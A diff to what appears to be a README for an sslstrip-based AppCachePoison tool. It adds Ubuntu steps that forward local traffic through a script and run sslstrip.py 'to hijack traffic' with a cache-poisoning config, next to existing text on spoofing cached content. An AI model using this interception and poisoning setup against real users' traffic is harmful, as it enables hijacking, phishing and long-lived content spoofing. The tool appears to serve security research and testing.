@@ -19,6 +19,23 @@ Exemplary response tampering with HTML AppCachePoison:
 	
 	As a bonus, once google analytics HTTP version will be requested, the spoofed content of it will be cached for 10 years.
 
+
+EASY LOCAL TESTING MITM (for Ubuntu systems):
+
+# create sslstrip admin user
+
+# forward local traffic
+$ sudo ./testmitm.sh start `id -u sslstrip`
+
+# run sslstrip to hijack traffic
+$ chown -R sslstrip /path/to/sslstrip/
+$ su sslstrip
+$ python sslstrip.py -t app_cache_poison/config.ini -p
+
+# stop
+$ sudo ./testmitm.sh stop
+
+
 More info:
 	http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html
 
